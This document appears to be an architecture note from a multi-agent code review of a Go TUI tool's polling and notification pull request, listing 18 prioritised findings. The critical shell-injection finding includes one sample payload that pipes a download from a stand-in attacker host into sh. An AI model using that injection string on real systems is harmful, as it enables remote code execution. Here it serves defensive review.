---
title: "Phase 2 Code Review: State Polling + Notifications"
category: architecture
tags: [code-review, phase-2, polling, notifications, security, performance]
date: 2026-02-13
pr: 2
branch: feat/phase-2-polling-notifications
status: findings-documented
---

# Phase 2 Code Review — State Polling + Notifications

6-agent parallel review of PR #2 (+2412 lines, 20 files, 39 tests passing).

## Agents Used

| Agent | Focus |
|-------|-------|
| security-sentinel | Shell injection, stdout bypass, config permissions |
| performance-oracle | Mutex contention, channel races, allocation patterns |
| architecture-strategist | Package boundaries, message flow, dual-state model |
| pattern-recognition-specialist | Duplication, naming, anti-patterns, error handling |
| agent-native-reviewer | CLI parity, programmatic access, config overrides |
| code-simplicity-reviewer | YAGNI, dead code, over-engineering |

## Findings Summary

- **P1 (Critical):** 3
- **P2 (Important):** 8
- **P3 (Nice-to-Have):** 7

---

## P1 — Critical (Blocks Merge)

### 1. Shell Injection in BuildDetectionScript

**File:** `internal/poller/detector.go:17-19`
**Agents:** security, pattern

`BuildDetectionScript` interpolates user-configurable `prompt_patterns` directly into a shell script string using `fmt.Sprintf`. The `escaped` variable is misleadingly named — it copies patterns verbatim with no escaping. A malicious config pattern like `"); curl evil.com | sh; echo ("` passes Go regex validation but breaks out of the `grep -qE` expression.

**Fix:** Shell-escape patterns (character allowlist or `%q` formatting), or write patterns to a temp file and use `grep -f`.

### 2. `fmt.Print("\a")` Bypasses Bubble Tea Stdout

**File:** `internal/notify/terminal.go:42`
**Agents:** security, architecture

`Bell.Ring()` writes the BEL character directly to stdout. Bubble Tea owns stdout in alt-screen mode. This can corrupt terminal rendering.

**Fix:** Use `fmt.Fprint(os.Stderr, "\a")` (many terminals process BEL on stderr), or return a `tea.Cmd` that writes through Bubble Tea.

### 3. Mutex Held During Entire Result Collection

**File:** `internal/poller/poller.go:162-172`
**Agent:** performance

`p.mu.Lock()` is acquired before `for r := range results`, which blocks until all goroutines complete (`wg.Wait()`). This holds the mutex for up to `ExecTimeout` (5s) per batch of workers, blocking `TriggerNow()` and `emitUpdate()`.

**Fix:** Collect results into a local slice without the lock, then lock briefly to apply:

```go
var collected []result
for r := range results {
    collected = append(collected, r)
}
p.mu.Lock()
for _, r := range collected { /* apply */ }
p.mu.Unlock()
```

---

## P2 — Important (Should Fix)

### 4. emitUpdate() Drain-and-Resend TOCTOU Race

**File:** `internal/poller/poller.go:186-198`
**Agents:** performance, architecture

Triple-nested select drains one message and resends. Between drain and resend, the consumer may read, making the send fail. A simple non-blocking send with `default` drop is sufficient.

### 5. Poller State Map Never Pruned

**File:** `internal/poller/poller.go:30`
**Agent:** architecture

`p.states` grows unboundedly. Destroyed Sprites accumulate entries forever. Prune after each `pollCycle` for names not in `List()` result.

### 6. "RUNNING"/"STARTED" Magic Strings

**File:** `internal/poller/poller.go:101`
**Agents:** pattern, architecture

Raw strings bypass status constants. Since `normalizeStatus()` already maps these to `StatusWorking`, these checks are likely dead code. Either trust normalization or add constants.

### 7. "UNREACHABLE" Hardcoded String

**File:** `internal/poller/state.go:62`
**Agent:** pattern

Should use `sprites.StatusUnreachable` constant.

### 8. Bell.Resume() Always Returns True

**File:** `internal/notify/terminal.go:53-57`
**Agents:** pattern, architecture, simplicity

Return value is always `true`, `now` parameter unused. Caller ignores return and checks `hasAttentionSprites()` separately. Remove return value and unused parameter.

### 9. Agent-Native Parity Gap

**Agents:** agent-native

5/7 Phase 2 features are TUI-only:
- `slua status --json` doesn't include polled states (WORKING/WAITING/FINISHED/ERROR)
- No CLI command to trigger a poll or run detection
- No programmatic notification subscription
- Config has no CLI flag or env var overrides
- Detection script not independently runnable

**Fix:** Add `slua detect [name...]` command and `Poller.Snapshot()` method. The primitives exist; only Cobra commands are missing.

### 10. Duplicate O(n) Attention Scan

**File:** `internal/tui/dashboard.go:221-228, 329-334`
**Agent:** performance

`hasAttentionSprites()` and `renderHeader()` both iterate all sprites. Cache attention count on state change.

### 11. Duplicate mockSource in Tests

**Files:** `poller/poller_test.go:14-38`, `tui/dashboard_test.go:18-35`
**Agent:** pattern

Extract to shared `internal/testutil/` package.

---

## P3 — Nice-to-Have

### 12. Config YAML System is YAGNI

**Package:** `internal/config/` (~327 lines)
**Agent:** simplicity

Full YAML config with Duration wrapper, validation, regex filtering, XDG resolution — but `Defaults()` is the only thing used. Defer file-based config until requested.

### 13. stopOnce sync.Once Never Used

**File:** `internal/poller/poller.go:33`
**Agents:** pattern, simplicity

Dead field. Poller lifecycle managed via context cancellation.

### 14. ShouldTrigger() Never Called in Production

**File:** `internal/notify/terminal.go:65-67`
**Agent:** simplicity

Only tested, never used. Dead code.

### 15. Custom contains() Reimplements strings.Contains

**File:** `internal/poller/detector_test.go:69-80`
**Agent:** pattern

Replace with `strings.Contains`.

### 16. ClearForSprite Memory Retention

**File:** `internal/notify/bar.go`
**Agent:** performance

Re-slice trick retains underlying array. Academic at maxStore=20.

### 17. strings.Builder Not Pre-sized in View()

**File:** `internal/tui/dashboard.go:293`
**Agent:** performance

Pre-size with `b.Grow(d.height * 100)`.

### 18. padRight/truncate Use Byte Length

**File:** `internal/tui/dashboard.go:469-483`
**Agent:** pattern

Operates on bytes not runes. Could slice mid-rune on multi-byte characters.

---

## Architecture Assessment

**Package boundaries:** Clean. `config` has zero internal deps. `notify` has zero internal deps. `poller` depends only on `sprites`. `tui` integrates all three. No circular dependencies.

**Message flow:** Idiomatic Bubble Tea subscription pattern. Poller → buffered channel → tea.Cmd → pollerUpdateMsg → Update() → re-subscribe.

**Dual-state model:** Correct. Poller maintains `map[string]*SpriteState` (operational data), Dashboard maintains `[]sprites.Sprite` (display model). One-way merge via `mergePollerStates`.

**Interface design:** `SpriteSource` at 3 methods is acceptable but borderline. Don't add more without splitting.

**Concurrency:** Race detector clean. Mutex usage correct. Bell/Bar accessed only from Bubble Tea's single-goroutine Update loop.

## Test Coverage

- 39 tests across 7 test files
- Poller: 5 tests (receives update, detects transition, TriggerNow, skips non-running, clean stop)
- State: 12 tests (ShouldPoll, backoff, transitions)
- Notify: 13 tests (bar FIFO, bell debounce, suspend/resume)
- Dashboard: 7 new Phase 2 tests (poller merge, lastPoll, bell suspend, notification bar)
- Config: 9 tests (defaults, validation, XDG, regex filtering)

## Positive Observations

- Clean primitive design in poller package — `BuildDetectionScript`, `Detect`, `ParseDetectionOutput` have no TUI coupling
- `SpriteSource` interface enables mock-based testing throughout
- Functional options pattern preserves backward compatibility with Phase 1 tests
- Bounded concurrency with exponential backoff is production-quality
- Value-copied snapshots in `PollerUpdate` prevent shared-mutable-state bugs
